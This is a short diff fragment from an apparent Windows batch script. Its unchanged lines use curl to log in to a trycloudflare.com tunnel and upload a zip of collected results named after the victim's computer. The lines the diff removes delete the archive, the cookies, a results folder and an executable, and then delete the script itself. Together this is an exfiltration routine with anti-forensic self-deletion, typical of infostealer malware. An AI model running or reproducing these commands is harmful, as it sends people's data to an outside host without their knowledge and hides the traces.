@@ -12,9 +12,4 @@ curl -c cookies.txt -d "name=alex" -d "pass=123" https://witnesses-secondary-ele
 curl -b cookies.txt -F "submit=1" -F "file[]=@result_%COMPUTERNAME%.zip" https://witnesses-secondary-elementary-promised.trycloudflare.com/Login/upload.php
 
 
-del "result_%COMPUTERNAME%.zip"
-del "cookies.txt"
-rmdir /s /q "results"
-del /f /q "%~dp01.exe"
-del "%~f0"
 
